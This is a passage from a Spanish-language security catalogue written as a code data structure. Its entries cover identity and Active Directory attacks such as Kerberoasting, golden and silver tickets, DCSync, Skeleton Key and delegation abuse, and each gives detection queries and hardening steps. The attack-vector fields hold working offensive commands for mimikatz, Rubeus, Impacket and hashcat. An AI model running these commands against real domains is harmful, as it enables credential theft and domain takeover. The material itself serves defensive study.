      kql: 'SigninLogs | where ResultType in ("50126","81004") | summarize cnt=count(), dusers=dcount(UserId) by IpAddress, bin(TimeGenerated, 1h) | where dusers > 10',
      spl: 'index=auth sourcetype=OktaIM2 outcome=FAILURE | stats count dc(user) by src_ip | where dc(user) > 10',
      win_event_ids: [4625, 4771, 4776],
    },
    mitigacion_hardening: ['Smart lockout + bloqueo por IP con umbrales agregados', 'Deshabilitar legacy auth (POP/IMAP/SMTP basic)', 'Password ban lists + passphrases largas + MFA antiphishing'],
    parcheo_remediacion: ['Bloquear las IPs fuente + IOC en firewall/proxy', 'Reset masivo de cuentas con login exitoso sospechoso en ventana', 'Activar identidad de riesgo / risk-based conditional access'],
    referencias: ['https://attack.mitre.org/techniques/T1110/003/', 'https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout'],
  },
  {
    id: 'AUTH-020',
    nombre: 'Credential stuffing / infostealer replay',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1110.004', 'T1555.003'],
    descripcion_tecnica: 'Combos email:password de breaches (o logs de infostealers como RedLine/Raccoon con cookies y tokens de sesión completos) se reintentan contra el IdP corporativo. Con cookies robadas, ni siquiera hay login — session replay directo.',
    impacto_iam_soc: 'Accesos "legítimos" desde dispositivos BYOD con cookies válidas: la única señal es el device fingerprint/IP nuevo. Los infostealers son el vector #1 de acceso inicial 2023-2025 (más que phishing).',
    vector_ataque: ['Compra de infostealer logs (marketplaces tipo Russian Market)', 'Replay de session cookies en browser fingerprint clonado', 'Combo lists contra el SSO'],
    deteccion: {
      kql: 'SigninLogs | where ResultType == 0 and DeviceDetail.isCompliant == false and RiskState == "none" | summarize dcount(IpAddress) by UserId, bin(TimeGenerated, 1d) | where dcount_IpAddress > 2',
      spl: 'index=auth outcome=SUCCESS new_device=true | stats count by user, geo | where geo changes > 2',
      win_event_ids: [4624],
    },
    mitigacion_hardening: ['Conditional Access: dispositivo compliant o dominado para apps sensibles', 'Session binding (token protection de Entra), cookies cortas', 'Vigilar credenciales corporativas en dark web (feed de infostealer logs)'],
    parcheo_remediacion: ['Revocar todas las sesiones del usuario afectado', 'Reset password + re-register MFA', 'Endpoint forense del dispositivo origen del robo'],
    referencias: ['https://attack.mitre.org/techniques/T1110/004/', 'https://www.cisa.gov/sites/default/files/publications/aa23-325a-joint-csa-idi-infostealers.pdf'],
  },
  {
    id: 'AUTH-021',
    nombre: 'Session fixation / token sin rotación post-login',
    categoria: 'Auth',
    severidad: 'Medium',
    mitre_attack: ['T1539'],
    descripcion_tecnica: 'El sessionId/token se establece ANTES de la autenticación (cookie pre-login, URL param) o no se regenera tras el login. El atacante planta su valor y la víctima "hereda" la sesión del atacante (o al revés tras XSS).',
    impacto_iam_soc: 'Hijack de sesión sin robar password. En portales internos legacy con JSESSIONID en URL: leak por referer + fixación trivial.',
    vector_ataque: ['Enviar link con session id pre-establecido en la URL', 'XSS que hace set-cookie de sesión fija', 'Subdominio con cookie injection (scope amplio de cookie)'],
    deteccion: {
      spl: 'index=web | eval sid_pre=if(match(url, ".*(jsessionid|phpsessid|sid)="), 1, 0) | stats sum(sid_pre) by uri_path',
    },
    mitigacion_hardening: ['Regenerar SIEMPRE el session id tras login', 'Cookies HttpOnly + Secure + SameSite=Lax y __Host- prefix', 'Nunca session ids en URLs'],
    parcheo_remediacion: ['Parchear el framework para rotar el id post-auth', 'Purgar sesiones fijadas (logout masivo)', 'CSP para matar el vector XSS'],
    referencias: ['https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html', 'OWASP Top 10 A07'],
  },
  {
    id: 'AUTH-022',
    nombre: 'IDOR / BOLA en APIs de identidad',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1190'],
    descripcion_tecnica: 'Endpoints de administración de identidad (GET /users/{id}/roles, DELETE /sessions/{id}) sin verificación de que el caller puede operar SOBRE ese id. Autenticación OK, autorización rota: cualquier usuario autenticado escala leyendo/modificando objetos ajenos.',
    impacto_iam_soc: 'Escalada horizontal (leer datos de otros) y vertical (auto-asignarse roles). Muy común en APIs internas y BFFs. Invisible para el SOC: son requests autenticados "normales" que devuelven 200.',
    vector_ataque: ['Fuzzear ids incrementales/UUIDs en endpoints admin', 'Manipular el body del request (userId ajeno) aunque la URL sea propia', 'Mass assignment: enviar role:"admin" en un update de perfil'],
    deteccion: {
      kql: 'AppHttpRequest | where Uri contains "/users/" and HttpStatusCode == 200 | summarize cnt=count(), dusers=dcount(UserId) by CallerUserId | where dusers > 20',
      spl: 'index=api uri="/users/*" status=200 | stats dc(object_id) by caller | where dc(object_id) > 20',
    },
    mitigacion_hardening: ['Autorización por-política en cada endpoint (ABAC: subject + resource + acción), nunca confiar en solo-auth', 'IDs no secuenciales + rate limiting', 'Bloquear mass assignment con DTOs estrictos (allowlist de campos)'],
    parcheo_remediacion: ['Añadir checks de ownership/rol en los endpoints afectados', 'Auditar logs en busca de abuso histórico (patrón 1 caller → N objetos)', 'Rotar credenciales/API keys si hubo escritura'],
    referencias: ['https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/', 'https://portswigger.net/web-security/access-control'],
  },
  /* ============================ ACTIVE DIRECTORY ============================ */
  {
    id: 'AD-001',
    nombre: 'Kerberoasting',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1558.003'],
    descripcion_tecnica: 'Cualquier usuario autenticado puede pedir un TGS para cualquier cuenta con SPN (service accounts). El TGS viaja cifrado con la clave NTLM de esa cuenta → se extrae y se rompe OFFLINE sin tocar el DC ni generar logs de fallo de autenticación.',
    impacto_iam_soc: 'Compromiso de service accounts (a menudo privilegiadas: SQL, backup, monitorización). Cero eventos de seguridad en el DC — solo un TGS request normal (4769). El crack es offline. Es el hallazgo #1 en cualquier pentest AD.',
    vector_ataque: [' GetUserSPNs.py -request -dc-ip <dc> corp/user // Rubeus kerberoast', 'hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64', 'Cuentas con password >25 chars o managed: crack falla'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4769 and TicketEncryptionType == "0x17" // RC4; correlacionar volumen de TGS por usuario y RC4 en entornos AES-only',
      spl: 'index=win EventCode=4769 EncryptionType=0x17 | stats count by user, service | where count > 10',
      sigma: 'win_susp_kerberos_rc4',
      win_event_ids: [4769],
    },
    mitigacion_hardening: ['Service accounts con passwords 25+ chars aleatorias o gMSA (rotación automática)', 'Eliminar SPNs de cuentas que no los necesitan', 'AclImatizar: AES-only en cuentas con SPN (desaprobar RC4 en el dominio)'],
    parcheo_remediacion: ['Rotar YA las passwords de cuentas kerberoasteables', 'Migrar a gMSA donde aplique', 'Hunt: 4769 con RC4 + servicios raros en ventana larga'],
    referencias: ['https://attack.mitre.org/techniques/T1558/003/', 'https://www.harmj0y.net/blog/powershell/kerberoasting-revisited/'],
  },
  {
    id: 'AD-002',
    nombre: 'AS-REP Roasting',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1558.004'],
    descripcion_tecnica: 'Cuentas sin pre-auth (DONT_REQ_PREAUTH) entregan un AS-REP cifrado con su NTLM hash sin necesidad de password. Se pide y se craquea offline igual que Kerberoasting. Se descubren con un scan LDAP (GetNPUsers.py).',
    impacto_iam_soc: 'Cuentas sin pre-auth = regalos. Suelen ser legacy/service accounts con passwords viejas y a veces privilegiadas. Sin logs de ataque: el AS-REP request es tráfico Kerberos legítimo (4768).',
    vector_ataque: ['GetNPUsers.py corp/ -no-pass -usersfile usuarios.txt', 'hashcat -m 18200 asrep.txt rockyou.txt'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4768 and PreAuthType == 0 | summarize count() by TargetUserName | take 20',
      spl: 'index=win EventCode=4768 PreAuth=0 | stats count by user',
      win_event_ids: [4768],
    },
    mitigacion_hardening: ['Auditar y eliminar el flag DONT_REQ_PREAUTH de TODAS las cuentas', 'Passwords 25+ chars en service accounts', 'Alertar sobre 4768 con pre-auth deshabilitado'],
    parcheo_remediacion: ['Set-ADAccountControl -DoesNotRequirePreauth $false en cada cuenta', 'Rotar passwords de las cuentas afectadas', 'Verificar si fueron craqueadas (hashcat propio)'],
    referencias: ['https://attack.mitre.org/techniques/T1558/004/', 'https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/'],
  },
  {
    id: 'AD-003',
    nombre: 'Golden Ticket (krbtgt)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1558.001'],
    descripcion_tecnica: 'Con el hash NTLM de krbtgt (obtenido via DCSync o dump del DC), el atacante firma TGTs arbitrarios: cualquier usuario, cualquier grupo (incl. DA), cualquier vida (10 años). El dominio confía en el TGT ciegamente — mientras el hash krbtgt siga siendo el mismo, el acceso es eterno.',
    impacto_iam_soc: 'Persistencia DEFINITIVA en el dominio. Sobrevive a resets de passwords de admins, parches y hasta reinstalaciones parciales. Única solución real: resetear krbtgt dos veces (el ticket actual y el anterior en el historial).',
    vector_ataque: ['Obtener hash krbtgt (DCSync: lsadump::dcsync /user:krbtgt)', 'ticketer.py -domain corp -nthash <hash> -domain-sid <sid> -user-id 500 fakeadmin', 'Pass-the-ticket al DC'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4624 and TicketOptions contains "0x40800000" or (EventID == 4768 and TicketLifetime > 10h) // TGTs con vida anómala; también 4769 con nombres de usuario inexistentes',
      spl: 'index=win (EventCode=4624 OR EventCode=4768) | eval tl=lifetime_h | where tl > 10 | stats count by user',
      win_event_ids: [4624, 4768, 4769],
    },
    mitigacion_hardening: ['Tier-0 hardening: quién puede DCSync (replication rights) auditado con BloodHound/ADExplorer', 'Password de krbtgt compleja (no se usa interactivamente, puede ser 128 chars)', 'Detección: TGTs con vidas/patrones anómalos, usuarios con RID 500 desde sesiones raras'],
    parcheo_remediacion: ['Reset krbtgt (twice, separados por el tiempo de vida de tickets — mínimo 12h idealmente 24h+) usando scripts oficiales de Microsoft (Reset-KrbtgtKey.ps1)', 'Validar replicación entre DCs tras cada reset', 'Asumir compromiso total: hunt con lista de IOC, revisar DA members, DACLs y delegaciones nuevas'],
    referencias: ['https://attack.mitre.org/techniques/T1558/001/', 'https://learn.microsoft.com/en-us/archive/blogs/prashant_jain/resetting-the-krbtgt-account-password'],
  },
  {
    id: 'AD-004',
    nombre: 'Silver Ticket (forja de TGS)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1558.002'],
    descripcion_tecnica: 'Con el NTLM hash de una SERVICE account (p. ej. la cuenta del SQL o IIS), el atacante forja directamente el TGS (no el TGT) para ese servicio: usuarios, grupos y PAC arbitrarios. No pasa por el KDC → el DC NO LOGUEA NADA (no hay 4768/4769).',
    impacto_iam_soc: 'Acceso al servicio afectado con privilegios arbitrarios y evasión total de logs del DC. Solo el servicio mismo (o su app) puede notar actividad anómala. Frecuente tras Kerberoasting.',
    vector_ataque: ['Kerberoastear cuenta del servicio → crack', 'ticketer.py -nthash <svc_hash> -domain-sid <sid> -spn MSSQLSvc/sql.corp.local:1433 fakeadmin', 'Acceso directo sin tocar el KDC'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4624 and LogonType == 8 or (EventID == 4624 and TargetUserName == "FAKE") // hunt: logons tipo batch/service sin 4768/4769 previo; PAC no verificado',
      spl: 'index=win EventCode=4624 | join left user [| search EventCode=4768 | stats count by user] | where isnull(4768_count)',
      win_event_ids: [4624],
    },
    mitigacion_hardening: ['Service accounts con claves 25+/gMSA (mata el vector)', 'PAC validation habilitada en servicios críticos', 'Auditoría de SPNs y reducción de cuentas con SPN'],
    parcheo_remediacion: ['Rotar la password de la service account comprometida (invalida los silver tickets)', 'Rotar krbtgt si hay indicios de golden', 'Hunt en el servicio afectado (SQL audit logs p. ej.)'],
    referencias: ['https://attack.mitre.org/techniques/T1558/002/', 'https://www.cybersecuritynews.com/silver-ticket-attack/'],
  },
  {
    id: 'AD-005',
    nombre: 'Diamond Ticket (TGT modificado en tránsito)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1558.001'],
    descripcion_tecnica: 'En vez de forjar un TGT desde cero (Golden), el atacante pide un TGT LEGÍTIMO, lo descifra (con el hash krbtgt), modifica el PAC (añade grupos privilegiados) y lo re-cifra. Resultado: un ticket con estructura normal — vidas, flags y campos validados por el KDC — mucho más difícil de detectar que un Golden.',
    impacto_iam_soc: 'Escalada con encubrimiento: los detectores de TGTs anómalos (vidas raras, usuarios inexistentes) no lo ven. Requiere igualmente el hash krbtgt, así que la respuesta es la misma que Golden Ticket.',
    vector_ataque: ['DCSync/dump del krbtgt hash', 'Rubeus diamond /ticketer con modificación de PAC en ticket legítimo'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4770 // ticket renewal anómalos; detectar claves KRBTGT reutilizadas vía eventos 14/16 de Kerberos-Key-Distribution-Center operational log',
      spl: 'index=win EventCode=4770 | stats count by user, service | where count > 5',
      win_event_ids: [4770],
    },
    mitigacion_hardening: ['Mismo que Golden: proteger krbtgt y Tier-0', 'Monitorizar el log operativo de KDC (Eventos 14/16: error de descifrado del PAC)', 'Rotación periódica de krbtgt (anual, no solo en incidentes)'],
    parcheo_remediacion: ['Doble reset de krbtgt', 'Hunt de sesiones con PAC inconsistente (verbose logging en DCs críticos)', 'Auditar membresías de grupos privilegiados'],
    referencias: ['https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/', 'https://attack.mitre.org/techniques/T1558/001/'],
  },
  {
    id: 'AD-006',
    nombre: 'Skeleton Key (backdoor DC)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1550.004', 'T1171'],
    descripcion_tecnica: 'Mimikatz inyecta en LSASS del DC una contraseña maestra ("mimikatz") que autentica a CUALQUIER usuario además de su password real. No toca la DB de AD — vive solo en memoria del LSASS. Requiere DA, pero da acceso como cualquier usuario sin modificar nada persistente.',
    impacto_iam_soc: 'Acceso universal como cualquier usuario (incluida la password real intacta — la víctima no nota nada). Se pierde al reiniciar el DC (no persistente), pero mientras tanto todo el dominio está comprometido. Firma: LSASS con DLL inyectada.',
    vector_ataque: ['Privilegio DA + mimikatz misc::skeleton en el DC', 'Login como cualquier usuario con la password "mimikatz"'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4624 and TargetUserName != "" // buscar logins exitosos de usuarios EXISTENTES desde un host desconocido + procesos raros en DC; Sysmon EventID 10 (ProcessAccess a lsass.exe) en DCs',
      spl: 'index=dc sourcetype=XmlWinEventLog EventCode=10 TargetImage="*lsass.exe" | stats count by SourceImage | where SourceImage NOT IN ("winlogon.exe", "csrss.exe")',
      sigma: 'sysmon_lsass_access_generic',
      win_event_ids: [4624],
    },
    mitigacion_hardening: ['RunAsPPL (Credential Guard) en DCs — bloquea el inyect en LSASS', 'EDR con protección anti-tamper en DCs', 'Alertar sobre ProcessAccess a lsass desde procesos no firmados en DCs'],
    parcheo_remediacion: ['Reiniciar los DCs (el skeleton vive en memoria)', 'Resetear passwords de cuentas críticas usadas', 'Forense completo del DC: no hay una sola inyección sin más'],
    referencias: ['https://attack.mitre.org/techniques/T1550/004/', 'https://www.adsecurity.org/?p=1667'],
  },
  {
    id: 'AD-007',
    nombre: 'DCSync (replicación maliciosa)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1003.006'],
    descripcion_tecnica: 'El protocolo de replicación de AD (DRSUAPI) permite a quien tenga el derecho "Replicating Directory Changes" (DCs, y por defecto DA/Enterprise Admins, pero también cuentas mal delegadas) pedir cualquier hash — incl. krbtgt. No hace falta código en el DC: se llama desde cualquier máquina.',
    impacto_iam_soc: 'Extracción de TODOS los hashes NTLM del dominio con un solo derecho mal asignado. Prerrequisito de Golden Ticket. Evento: 4662 (replicación de directory service) desde una cuenta que no es un DC.',
    vector_ataque: ['Cuenta con Replicate Directory Changes (o DA)', 'lsadump::dcsync /user:corp\\krbtgt o secretsdump.py -just-dc'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4662 and ObjectServer == "DS" and (ObjectName contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" or ObjectName contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") and SubjectUserName !endswith "$" // replica desde no-DC',
      spl: 'index=win EventCode=4662 ObjectName="*1131f6*" | stats count by user, src | where src NOT LIKE "%dc%"',
      sigma: 'win_dcsync_dcsync',
      win_event_ids: [4662],
    },
    mitigacion_hardening: ['Auditar quién tiene GetChanges/GetChangesAll (Powerview: Get-DomainObjectACL) y reducirlo a solo DCs', 'Alertar SIEMPRE sobre 4662 con GUIDs de replicación desde cuentas que no terminan en $', 'Proteger adminSDHolder para evitar auto-elevaciones'],
    parcheo_remediacion: ['Quitar el derecho de replicación indebido', 'Rotar krbtgt (double reset) si se confirmó DCSync', 'Hunt: hashes extraídos = asumir golden tickets → revisar 4768 anómalos'],
    referencias: ['https://attack.mitre.org/techniques/T1003/006/', 'https://www.dsinternals.com/en/dumping-domain-password-hasheselegantly/'],
  },
  {
    id: 'AD-008',
    nombre: 'DCShadow (registro de DC falso)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1207', 'T1003.006'],
    descripcion_tecnica: 'El atacante (DA) registra su máquina como controlador de dominio modificando el esquema (nTDSDSA objects, SPN de DC) y empuja cambios de objetos (p. ej. SIDHistory en una cuenta) vía replicación legítima — el cambio entra al dominio SIN generar eventos 5136/4662 convencionales porque "viene de un DC". Al terminar, borra el objeto DC falso.',
    impacto_iam_soc: 'Modificación del dominio con evasión de auditoría de cambios: los DCs reales aceptan la replicación como válida. Detección: 5136/5137/5141 (replicación de directorio) desde hosts NO conocidos como DC, y aparición de nuevos nTDSDSA en CN=Sites.',
    vector_ataque: ['DA + mimikatz lsadump::dcshadow (dos procesos: uno impersonando DC, otro empujando)', 'Set SIDHistory/grupo en objeto víctima'],
    deteccion: {
      kql: 'SecurityEvent | where EventID in (5136,5137,5141) | where SubjectUserName contains "DCSHADOW" or (EventID == 5141 and SourceComputer != expected_dcs) // replicación desde host no-DC',
      spl: 'index=win (EventCode=5136 OR EventCode=5141) | stats count by host, object_class | where object_class="nTDSDSA" OR host NOT IN (dc_list)',
      win_event_ids: [5136, 5137, 5141],
    },
    mitigacion_hardening: ['Monitorizar objetos nTDSDSA nuevos y cambios en CN=Sites', 'PAM/JIT para DA: ninguna sesión DA permanente', 'Baseline de DCs legítimos en el SIEM y alerta de replicación desde otros hosts'],
    parcheo_remediacion: ['Revertir los objetos modificados (SIDHistory, membresías)', 'Forense del DC falso', 'Rotar credenciales afectadas'],
    referencias: ['https://attack.mitre.org/techniques/T1207/', 'https://www.dcshadow.com/'],
  },
  {
    id: 'AD-009',
    nombre: 'Pass-the-Hash (PtH)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1550.002'],
    descripcion_tecnica: 'Con el hash NTLM de un usuario (dumpeado de LSASS/registro/SAM), el atacante autentica como ese usuario SIN la password. NTLM y (en escenarios legacy) incluso Kerberos aceptan pruebas de posesión del hash. La password puede ser de 40 chars: da igual.',
    impacto_iam_soc: 'Movimiento lateral estándar en Windows. Con el hash de un admin local reutilizado (IP local admin password reuse) → salto de host en host. Señales: 4624 tipo 3 con NTLM (paquetes de red NTLM), eventos 4624 con LogonProcessName=NtLmSsp en hosts donde no corresponde.',
    vector_ataque: ['Dump LSASS (mimikatz sekurlsa::logonpasswords, comsvcs MiniDump)', 'sekurlsa::pth /user:admin /ntlm:<hash>', 'Reutilización de admin local: crackmapexec --local-auth smb'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4624 and AuthenticationPackageName == "NTLM" and LogonType == 3 | summarize dcount(Computer) by TargetUserName | where dcount_Computer > 5',
      spl: 'index=win EventCode=4624 AuthPackage=NTLM LogonType=3 | stats dc(dest) by user | where dc(dest) > 5',
      sigma: 'win_pass_the_hash_4624',
      win_event_ids: [4624, 4625, 4776],
    },
    mitigacion_hardening: ['Credential Guard / RunAsPPL en hosts críticos', 'LAPS para admins locales (passwords únicas por host)', 'Deshabilitar NTLM en la medida del posible; Kerberos-only + SMB signing'],
    parcheo_remediacion: ['Rotar passwords de las cuentas comprometidas (invalida los NTLM hashes)', 'Limpiar sesiones y tickets (klist purge)', 'Hunt: mapa de 4624 NTLM tipo 3 por pares usuario→host'],
    referencias: ['https://attack.mitre.org/techniques/T1550/002/', 'https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/'],
  },
  {
    id: 'AD-010',
    nombre: 'Pass-the-Ticket / Overpass-the-Hash',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1550.003'],
    descripcion_tecnica: 'Robo de tickets Kerberos (TGT/TGS) de memoria (LSASS) o de disco (ccache de Linux, MIT Kerberos) y su reuso directo desde otra máquina. Overpass-the-hash: convertir un NTLM hash en un TGT legítimo pidiendo un AS-REQ normal.',
    impacto_iam_soc: 'Acceso a recursos como el usuario sin password ni hash knowledge — solo el ticket. En entornos híbridos, los tickets de Linux (keytabs de servicios, .k5login mal configurados) son un jardín de tickets reusables.',
    vector_ataque: ['mimikatz kerberos::list /export o Rubeus dump', 'Exportar /tmp/krb5cc_* de un servidor Linux comprometido', 'OverPtH: Rubeus asktgt /ntlm:<hash> /ptt'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4769 and IpAddress != expected_ip_of_user // TGS usados desde IPs nuevas; 4624 tipo 3 con Kerberos desde host no habitual',
      spl: 'index=win EventCode=4769 | stats dc(src) by user | where dc(src) > 3 | sort - dc(src)',
      win_event_ids: [4624, 4768, 4769],
    },
    mitigacion_hardening: ['Reducir vida de tickets (GPO: max ticket age 4-10h)', 'PPL/Credential Guard contra dumps de LSASS', 'En Linux: keytab permisos 400, kvno/uuid revisados, no .k5login'],
    parcheo_remediacion: ['klist purge + logout de sesiones', 'Rotar password de las cuentas cuyos tickets se robaron', 'Buscar el host origen del dump'],
    referencias: ['https://attack.mitre.org/techniques/T1550/003/', 'https://adsecurity.org/?p=1667'],
  },
  {
    id: 'AD-011',
    nombre: 'SID History injection',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1134.005'],
    descripcion_tecnica: 'El atributo sIDHistory permite que una cuenta lleve SIDs de OTRA cuenta/grupo (diseñado para migraciones). Con DA (o DCShadow/DCSync para escribir), un atacante añade el SID del grupo Domain Admins (RID 512) o Enterprise Admins a una cuenta baja → acceso total sin pertenecer al grupo visible.',
    impacto_iam_soc: 'Escalada invisible: el membership check del token usa el SID History. whoami /groups muestra el * en el SID pero la consola de AD no lo muestra como miembro. Detección: 4765/4738 (cambio de grupo/usuario con sIDHistory) y queries LDAP de sIDHistory != null fuera de migraciones.',
    vector_ataque: ['DA: mimikatz sid::patch + sid::add /sid:S-1-5-21-...-512', 'DCShadow para escribir sIDHistory sin auditoría'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4765 or (EventID == 4738 and SidHistory != "") | project TimeGenerated, TargetUserName, SidHistory',
      spl: 'index=win (EventCode=4765 OR EventCode=4738) | where sid_history != ""',
      sigma: 'win_sid_history_injection',
      win_event_ids: [4765, 4738],
    },
    mitigacion_hardening: ['Auditar sIDHistory en todo el dominio (Get-ADUser -Properties sidhistory): debe estar vacío salvo migración activa', 'Alertar sobre cualquier 4765/4738 con SIDHistory', 'RID 512/519 nunca en sIDHistory'],
    parcheo_remediacion: ['Limpiar el sIDHistory de las cuentas afectadas', 'Rotar credenciales de cuentas tocadas', 'Investigar el vector de escritura (DA? DCShadow?)'],
    referencias: ['https://attack.mitre.org/techniques/T1134/005/', 'https://adsecurity.org/?p=1772'],
  },
  {
    id: 'AD-012',
    nombre: 'Shadow Credentials (msDS-KeyCredentialLink)',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1550.003'],
    descripcion_tecnica: 'Si puedes ESCRIBIR el atributo msDS-KeyCredentialLink de un objeto (DACL GenericWrite/Owner), le asocias una clave RAW (como si fuera WHfB). Luego haces PKINIT con esa clave y obtienes un TGT para ese objeto — autenticación como él sin tocar su password.',
    impacto_iam_soc: 'Impersonación de usuarios y COMPUTADORAS (muy usado contra objetos computer para llegar al DC: trust account del DC → DCSync). Depende de CA de WHfB presente. Detección: 5136 cambios en msDS-KeyCredentialLink fuera de flujo de enrolamiento.',
    vector_ataque: ['Whisker/pywhisker: add key credential al objeto víctima', 'Rubeus asktgt /user:victima /certificate:<der>'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 5136 and AttributeLDAPDisplayName == "msDS-KeyCredentialLink" | project TimeGenerated, SubjectUserName, ObjectDN',
      spl: 'index=win EventCode=5136 msDS-KeyCredentialLink | stats count by user, object',
      sigma: 'win_shadow_credentials',
      win_event_ids: [5136],
    },
    mitigacion_hardening: ['Auditar GenericWrite/Owner sobre objetos críticos (BloodHound "WriteDacl/WriteOwner" paths)', 'Alertar 5136 sobre msDS-KeyCredentialLink no iniciado por el propio usuario/ADC', 'Restringir enrollment de WHfB a dispositivos compliant'],
    parcheo_remediacion: ['Eliminar los key credentials fraudulentos del objeto', 'Reset password de la cuenta y purge de tickets', 'Revisar DACLs que permitieron la escritura'],
    referencias: ['https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab', 'https://github.com/eladshamir/Whisker'],
  },
  {
    id: 'AD-013',
    nombre: 'Delegación sin restricciones (Unconstrained)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1550.005', 'T1210'],
    descripcion_tecnica: 'Cuentas/computadoras con TRUSTED_FOR_DELEGATION guardan en caché el TGT FORWARDADO de cualquiera que se autentique contra ellas. Comprometida una máquina unconstrained, se extraen los TGTs de todos los usuarios que conectaron (incl. un admin, o mejor: el propio DC si se abusa de Printer Bug para forzar al DC a autenticarse).',
    impacto_iam_soc: 'Escalada a Domain Admin trivial: MS-RPRN (PrinterBug) fuerza al DC a autenticarse a tu listener → cae el TGT del DC en la caché → DCSync. Señal: 4769 con el flag "forwarded" y cuentas admin autenticándose en hosts no esperados.',
    vector_ataque: ['BloodHound: find unconstrained delegation hosts', 'mimikatz sekurlsa::tickets en el host comprometido', 'Rubeus printerbug dc.corp.local atacante.local → capturar TGT del DC'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4769 and TicketOptions == "0x40810000" // forwarded flag; también 4624 LogonType 3 con Kerberos hacia hosts unconstrained fuera de horario',
      spl: 'index=win EventCode=4769 TicketOptions="0x40810000" | stats count by service, user',
      win_event_ids: [4624, 4769],
    },
    mitigacion_hardening: ['Migrar todo a constrained/RBCD (o deshabilitar delegación)', 'No permitir cuentas sensibles para delegación (flag en cuentas admin: Account is sensitive and cannot be delegated)', 'Auditar el flag TRUSTED_FOR_DELEGATION en todo el dominio'],
    parcheo_remediacion: ['Quitar el flag de unconstrained del host', 'Rotar krbtgt (si se capturó TGT del DC: tratar como Golden)', 'Purgar tickets y sesiones en el host comprometido'],
    referencias: ['https://attack.mitre.org/techniques/T1550/005/', 'https://adsecurity.org/?p=1667'],
  },
  {
    id: 'AD-014',
    nombre: 'Constrained Delegation abusa (S4U2Self/S4U2Proxy)',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1550.005'],
    descripcion_tecnica: 'La delegación restringida (S4U) permite a un servicio pedir tickets EN NOMBRE de un usuario hacia servicios whitelisted (msDS-AllowedToDelegateTo). Con control de una cuenta con constrained delegation (y su password/hash), el atacante se hace pasar por CUALQUIER usuario (incluso admins) hacia los servicios listados.',
    impacto_iam_soc: 'Impersonación selectiva hacia servicios específicos (a menudo CIFS, MSSQL, HTTP del DC = camino a DA). La señal: 4769 con formulario de servicio extraño y las transiciones de protocolo que no coinciden con el comportamiento esperado del servicio.',
    vector_ataque: ['Comprometer la cuenta con delegación (kerberoast/hash)', 'kekeo::tgs o Rubeus s4u (impersonar a admin hacia cifs/dc)'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4769 and ServiceName in ("cifs/dc", "host/dc", "mssqlsvc/*") and TargetUserName != "krbtgt" // tickets hacia servicios de DC pedidos por cuentas de servicio',
      spl: 'index=win EventCode=4769 | stats count by user, service | where service IN ("cifs/*","mssqlsvc/*","host/*") AND user LIKE "*$"',
      win_event_ids: [4769],
    },
    mitigacion_hardening: ['Auditar msDS-AllowedToDelegateTo en todo el dominio (cuentas y equipos)', 'Migrar a RBCD con protégé-accounts donde aplique', 'Cuentas sensibles: no delegables + no aparecer en listas S4U'],
    parcheo_remediacion: ['Rotar la password de la cuenta de delegación comprometida', 'Revisar/reducir los SPNs de msDS-AllowedToDelegateTo', 'Purgar tickets y auditar el uso del servicio afectado'],
    referencias: ['https://attack.mitre.org/techniques/T1550/005/', 'https://www.harmj0y.net/blog/activedirectory/s4u2pwn/'],
  },
  {
    id: 'AD-015',
    nombre: 'RBCD abuse (Resource-Based Constrained Delegation)',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1550.005', 'T1134'],
    descripcion_tecnica: 'La delegación basada en recursos vive en el atributo msDS-AllowedToActOnBehalfOfOtherIdentity del OBJETIVO. Si un atacante puede escribir ese atributo (GenericWrite sobre una computadora, o es ACCOUNT OPERATOR), añade una cuenta que controla y se autentica como CUALQUIER usuario (incl. DA) hacia esa máquina → acceso total al host.',
    impacto_iam_soc: 'Takeover de servidores: muy usado contra servidores de impresión/relays (combina con NTLM relay a LDAP: coercion + RBCD = SYSTEM en el host). Después: dump de credenciales locales y escalada lateral. Señal: 5136 sobre msDS-AllowedToActOnBehalfOfOtherIdentity.',
    vector_ataque: ['Obtener GenericWrite sobre un objeto computer (o relay NTLM→LDAP como en ShadowCreep)', 'rbcd.py / Set-RBCD para añadir la cuenta atacante', 'getST.py -impersonate administrator -spn cifs/victima.corp.local'],
    deteccion: {
